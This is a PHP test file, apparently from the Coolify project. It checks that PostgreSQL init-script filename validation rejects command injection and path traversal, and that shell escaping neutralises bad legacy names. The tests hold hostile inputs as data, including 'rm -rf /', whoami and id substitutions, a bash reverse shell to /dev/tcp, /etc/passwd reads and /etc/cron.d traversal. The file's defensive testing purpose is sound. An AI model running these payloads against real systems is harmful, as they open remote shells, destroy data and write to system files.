<?php

/**
 * PostgreSQL Init Script Security Tests
 *
 * Tests to ensure PostgreSQL init script management is protected against
 * command injection attacks via malicious filenames.
 *
 * Related Issues: #3, #4 in security_issues.md
 * Related Files: app/Livewire/Project/Database/Postgresql/General.php
 */
test('postgresql init script rejects command injection in filename with command substitution', function () {
    expect(fn () => validateShellSafePath('test$(whoami)', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects command injection with semicolon', function () {
    expect(fn () => validateShellSafePath('test; rm -rf /', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects command injection with pipe', function () {
    expect(fn () => validateShellSafePath('test | whoami', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects command injection with backticks', function () {
    expect(fn () => validateShellSafePath('test`id`', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects command injection with ampersand', function () {
    expect(fn () => validateShellSafePath('test && whoami', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects command injection with redirect operators', function () {
    expect(fn () => validateShellSafePath('test > /tmp/evil', 'init script filename'))
        ->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('test < /etc/passwd', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects reverse shell payload', function () {
    expect(fn () => validateShellSafePath('test$(bash -i >& /dev/tcp/10.0.0.1/4444 0>&1)', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script escapes filenames properly', function () {
    $filename = "init'script.sql";
    $escaped = escapeshellarg($filename);

    expect($escaped)->toBe("'init'\\''script.sql'");
});

test('postgresql init script escapes special characters', function () {
    $filename = 'init script with spaces.sql';
    $escaped = escapeshellarg($filename);

    expect($escaped)->toBe("'init script with spaces.sql'");
});

test('postgresql init script accepts legitimate filenames', function () {
    expect(fn () => validateShellSafePath('init.sql', 'init script filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('01_schema.sql', 'init script filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('init-script.sh', 'init script filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('setup_db.sql', 'init script filename'))
        ->not->toThrow(Exception::class);
});

// Path traversal — GHSA-mv4c-9x67-rrmv regression tests
test('postgresql init script rejects path traversal with ../ sequence', function () {
    expect(fn () => validateFilenameSafe('../../../etc/cron.d/pwn', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects path traversal targeting /etc/cron.d', function () {
    expect(fn () => validateFilenameSafe('../../../../../etc/cron.d/k4zrce', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects absolute path', function () {
    expect(fn () => validateFilenameSafe('/etc/passwd', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects filename with forward slash', function () {
    expect(fn () => validateFilenameSafe('subdir/evil.sql', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects filename with backslash', function () {
    expect(fn () => validateFilenameSafe('subdir\\evil.sql', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects double-dot without slashes', function () {
    expect(fn () => validateFilenameSafe('..', 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script rejects null byte injection', function () {
    expect(fn () => validateFilenameSafe("init.sql\0../../etc/passwd", 'init script filename'))
        ->toThrow(Exception::class);
});

test('postgresql init script accepts legitimate filenames via validateFilenameSafe', function () {
    expect(fn () => validateFilenameSafe('init.sql', 'init script filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateFilenameSafe('01_schema.sql', 'init script filename'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateFilenameSafe('init-script.sh', 'init script filename'))
        ->not->toThrow(Exception::class);
});

// Write-site defence — basename() + escapeshellarg() keep legacy/bad rows safe
test('basename() strips path traversal from legacy filenames at write site', function () {
    expect(basename('../../../etc/cron.d/pwn'))->toBe('pwn');
    expect(basename('/etc/passwd'))->toBe('passwd');
    expect(basename('subdir/evil.sql'))->toBe('evil.sql');
});

test('escapeshellarg() neutralises shell metacharacters in tee target', function () {
    // Simulates how StartPostgresql::generate_init_scripts() builds the tee argument
    $configuration_dir = '/data/coolify/databases/abc123';
    $legacy_filename = basename('foo bar*.sql;rm -rf /');
    $target = "$configuration_dir/docker-entrypoint-initdb.d/{$legacy_filename}";
    $escaped = escapeshellarg($target);

    // Single-quoted in POSIX sh means no expansion / no extra args regardless of contents.
    expect($escaped)->toStartWith("'")->toEndWith("'");
    expect($escaped)->toContain('foo bar*.sql;rm -rf');
});
